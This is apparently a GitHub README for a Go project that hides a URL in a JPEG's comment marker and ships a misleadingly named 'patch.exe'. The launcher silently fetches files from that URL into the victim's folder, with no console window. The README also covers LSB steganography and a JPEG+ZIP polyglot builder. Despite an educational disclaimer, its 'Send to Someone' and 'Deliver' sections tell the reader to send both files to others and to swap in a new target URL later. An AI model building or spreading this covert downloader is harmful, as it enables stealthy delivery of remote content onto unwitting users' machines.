> [!WARNING]
> **This repository is strictly for educational and research purposes.**
> It demonstrates file format internals (JPEG marker structure, steganography) and Go systems programming.
> Do **not** use this code to distribute files to people without their knowledge or consent.
> The author and contributors assume no responsibility for misuse.
> **⚠️ Windows only** — `patch.exe` is a Windows PE binary. It will not run on Linux or macOS.

# JPEG Steganography — COM Marker + Go Launcher

A complete study of hiding a URL inside a normal JPEG image using the JPEG
Comment (COM) marker, and a pure-Go binary (`patch.exe`) that silently extracts
and acts on it. Everything is standard library — no C, no third-party packages.

---

## TL;DR — Send to Someone

Send these **two files** together:

| File | What it is |
|---|---|
| `cat_photo.jpg` | Normal-looking JPEG with a URL hidden in its JPEG comment marker |
| `patch.exe` | Windows executable that reads the URL and downloads 20 copies |

**What happens when they run `patch.exe`:**
1. Reads `cat_photo.jpg` from the same folder (finds it via its own exe path)
2. Extracts the URL hidden in the JPEG COM marker (`FF FE` segment)
3. Downloads 20 copies of the image to **their current working directory**
   - Double-clicked from `C:\Users\uma\Files` → saves there
   - Double-clicked from `C:\Users\goku\Documents` → saves there
   - Any user, any path — no hardcoded usernames
4. Files saved as `photo_01.jpg` through `photo_20.jpg`
5. No console window, no visible trace

**Override options (run from cmd/PowerShell):**
```
patch.exe -dir "C:\Users\uma\Pictures"     custom save location
patch.exe -url "https://example.com/x.jpg" custom image URL
patch.exe -dir "..." -url "..."            both
```

> **Requirements:** Windows only (uses `-H windowsgui` PE flag)

---

## Tech Stack

| Layer         | Technology                        | Why                                              |
|---------------|-----------------------------------|--------------------------------------------------|
| Language      | Go 1.21+                          | Statically compiled, no runtime, cross-platform  |
| HTTP          | net/http (stdlib)                 | Downloads with automatic redirect following      |
| Binary I/O    | encoding/binary (stdlib)          | Big/little-endian multi-byte integer parsing     |
| Concurrency   | sync.WaitGroup + goroutines       | Overlaps 20 HTTP GET calls to minimise wait time |
| Path resolve  | os.Executable + path/filepath     | Finds photo.jpg next to the exe, not via cwd     |
| Build flag    | -ldflags="-H windowsgui"          | PE subsystem=2, suppresses the console window    |
| CGO           | CGO_ENABLED=0                     | Pure Go binary, no C runtime dependency          |
| Image format  | JPEG / JFIF (ISO/IEC 10918-1)     | COM marker is ancillary — parsers skip it        |

---

## Project Structure

```
Payload-System/
├── photo.jpg              <- Carrier: valid JPEG + URL in COM marker
├── go.mod
├── README.md              <- This file
├── .gitignore
└── cmd/
    ├── comembed/main.go   <- Embeds a string into JPEG COM marker
    ├── embed/main.go      <- LSB bit-level steganography (binary payloads)
    ├── jpegzip/main.go    <- JPEG + ZIP stack polyglot builder
    └── patch/main.go      <- Launcher: reads COM -> downloads 20 images
```

---

## Concepts

### 1. JPEG File Format

A JPEG is a sequential stream of "markers". Every marker is 2 bytes:
0xFF followed by a 1-byte code. Most markers are followed by a length-prefixed
segment:

```
FF D8              <- SOI  (Start Of Image)   no length field
FF E0 [len] [data] <- APP0 (JFIF header)
FF E1 [len] [data] <- APP1 (Exif metadata)
FF DB [len] [data] <- DQT  (quantization tables)
FF C0 [len] [data] <- SOF0 (frame header: width, height, components)
FF C4 [len] [data] <- DHT  (Huffman tables)
FF DA [len] [data] <- SOS  (Start Of Scan — compressed pixel data)
FF D9              <- EOI  (End Of Image)     no length field
```

Segment length field layout (big-endian):

```
[FF] [marker] [len_hi] [len_lo] [data bytes ...]
               |_______________|
               uint16, big-endian
               INCLUDES the 2 length bytes themselves
               Does NOT include FF + marker prefix
```

So: data starts at offset+4, spans (segLen - 2) bytes.

### 2. COM Marker (0xFF 0xFE)

Defined in ISO/IEC 10918-1 §B.2.4.5. It is an ancillary segment for
human-readable comments. Decoders MUST skip it if they don't need it.

This is the steganographic channel we exploit:

    Image viewer -> sees FF D8 -> renders image -> skips FF FE -> done.
    patch.exe    -> reads bytes -> walks markers -> finds FF FE -> extracts URL.

Zero pixel data is changed. The image is visually identical.

### 3. Embedding Layout

After embedding, the file's byte layout is:

```
[0..1]   FF D8           <- JPEG SOI (preserved, untouched)
[2..3]   FF FE           <- COM marker code
[4..5]   uint16 BE       <- segLen = len(URL) + 2
[6..N]   URL bytes       <- "https://..."
[N+1..]  original JPEG   <- APP0 + DQT + SOF0 + DHT + SOS + EOI
```

We insert the COM segment right after SOI so it is always the first
thing encountered after the mandatory magic bytes.

### 4. COM Marker Walking Algorithm (Go)

```go
i := 2 // skip SOI (FF D8)
for i < len(data)-3 {
    if data[i] != 0xFF { i++; continue }

    marker := data[i+1]
    segLen := int(binary.BigEndian.Uint16(data[i+2 : i+4]))

    if marker == 0xFE { // COM found
        payload := data[i+4 : i+2+segLen] // segLen-2 bytes of data
        return string(payload), nil
    }

    if segLen < 2 { break }
    i += 2 + segLen // advance to next marker
}
```

Key: `binary.BigEndian.Uint16` reads 2 bytes MSB-first (network byte order),
matching the JPEG specification.

### 5. LSB Steganography (embed tool, alternative method)

Instead of using a named JPEG marker, LSB hides data in the lowest bit of
every carrier byte. Capacity = 1 bit per byte. Visual impact: at most 1
intensity step per channel (imperceptible).

Wire format (1 bit per carrier byte, MSB-first):

```
bits  0-31   : uint32 big-endian = payload length in bytes
bits 32+     : payload bytes, 8 bits each
```

Bit write operation:
```go
stego[offset] = (carrier[offset] & 0xFE) | bit   // clear bit0, set to our bit
```

Bit read operation:
```go
bit = carrier[offset] & 1
```

Critical for JPEG: skip the first 2 bytes (SOI = FF D8). Writing into byte 0
would change FF to FE, invalidating the JPEG magic.

### 6. JPEG + ZIP Stack Polyglot (jpegzip tool)

Two file format parsers with complementary blind spots:

```
[JPEG bytes ... FF D9] [ZIP local headers ... central dir ... EOCD]
 ^-- JPEG reads forward, stops at FF D9
                        ^-- ZIP reads backward from EOF for EOCD signature
```

Each parser ignores the other's data. The same file opens as an image in
Windows Photos and extracts normally with 7-Zip or `unzip`.

ZIP uses little-endian integers (opposite of JPEG). When prepending JPEG
data, all "local file header offset" fields in the ZIP Central Directory
must be patched by += jpegSize:

```go
// Central Directory entry, bytes 42-45: local header offset
old := binary.LittleEndian.Uint32(data[i+42 : i+46])
binary.LittleEndian.PutUint32(data[i+42:], old+jpegSize)

// EOCD record, bytes 16-19: start of central directory
old = binary.LittleEndian.Uint32(data[i+16 : i+20])
binary.LittleEndian.PutUint32(data[i+16:], old+jpegSize)
```

### 7. Concurrent Downloads (patch.exe)

```go
var wg sync.WaitGroup
for i := 1; i <= 20; i++ {
    wg.Add(1)
    go func(n int) {       // goroutine — lightweight thread (~2KB stack)
        defer wg.Done()    // guaranteed decrement even on panic
        downloadFile(url, dest)
    }(i)                   // pass i by value — closures capture by reference
}
wg.Wait()                  // block until counter reaches 0
```

HTTP GET is I/O-bound. Running 20 goroutines concurrently means all 20
complete in roughly the time of one sequential download. Go's scheduler
parks goroutines while they wait for network I/O, giving CPU to others.

### 8. os.Executable() — reliable exe-relative paths

```go
exe, _ := os.Executable()               // absolute path of the running binary
dir    := filepath.Dir(exe)             // directory containing the binary
jpg    := filepath.Join(dir, "photo.jpg")  // photo.jpg next to the exe
```

This works even when launched from a different working directory (e.g.
double-clicked in Explorer from a different folder). Never use os.Getwd()
for this — it returns the shell's current directory, not the exe's location.

---

## Step-by-Step Build Guide

### Prerequisites

- Go 1.21 or later  (`go version`)
- Windows (for `-H windowsgui`; remove flag for Linux/macOS)

### Step 1 — Module init

    mkdir Payload-System && cd Payload-System
    go mod init payload_system

### Step 2 — Build the embed tool

    go build -o comembed.exe ./cmd/comembed

### Step 3 — Prepare your carrier JPEG

Any JPEG works. Verify it is valid:

    $b = [IO.File]::ReadAllBytes("photo.jpg")
    "0x{0:X2} 0x{1:X2}" -f $b[0],$b[1]   # must print: 0xFF 0xD8

### Step 4 — Embed the URL into the JPEG COM marker

    .\comembed.exe -jpg photo.jpg -script "https://example.com/image.jpg" -out photo.jpg

Verify the round-trip (PowerShell):

    $b=[IO.File]::ReadAllBytes("photo.jpg"); $i=2
    while($i -lt $b.Length-3){
        if($b[$i] -eq 0xFF){
            $l=($b[$i+2]-shl 8) -bor $b[$i+3]
            if($b[$i+1] -eq 0xFE){ [Text.Encoding]::UTF8.GetString($b,$i+4,$l-2); break }
            $i+=2+$l
        } else { $i++ }
    }

Expected: the URL you passed. Open photo.jpg in Windows Photos — it displays normally.

### Step 5 — Build patch.exe (the Go launcher)

    set CGO_ENABLED=0
    go build -ldflags="-H windowsgui" -o patch.exe ./cmd/patch

### Step 6 — Deliver

Place `photo.jpg` and `patch.exe` in the same folder. When `patch.exe` runs:

1. Resolves photo.jpg next to itself via os.Executable()
2. Reads raw bytes, walks JPEG marker stream
3. Finds FF FE COM segment, extracts URL string
4. Spawns 20 goroutines, each does http.Get(url)
5. Writes photo_01.jpg through photo_20.jpg to Desktop
6. No console window (PE subsystem = windowsgui)

### Changing the URL later (no rebuild needed)

    .\comembed.exe -jpg photo.jpg -script "https://new-target.com/img.jpg" -out photo.jpg

patch.exe reads the URL at runtime from photo.jpg's COM marker.

---

## Reference

| Marker | Code    | Purpose                          |
|--------|---------|----------------------------------|
| SOI    | FF D8   | Start of JPEG file (magic bytes) |
| APP0   | FF E0   | JFIF header                      |
| APP1   | FF E1   | Exif metadata                    |
| COM    | FF FE   | Comment — our steganographic slot|
| SOS    | FF DA   | Start of compressed scan data    |
| EOI    | FF D9   | End of JPEG file                 |

| ZIP Signature | Value       | Structure                     |
|---------------|-------------|-------------------------------|
| Local header  | 50 4B 03 04 | Per-file, before data         |
| Central dir   | 50 4B 01 02 | Index at end of archive       |
| EOCD          | 50 4B 05 06 | End-of-central-directory      |

| COM field     | Offset | Size   | Value                        |
|---------------|--------|--------|------------------------------|
| Marker prefix | i+0    | 2 bytes| FF FE                        |
| Length        | i+2    | 2 bytes| uint16 BE = len(data)+2      |
| Payload       | i+4    | n bytes| URL / script / any string    |


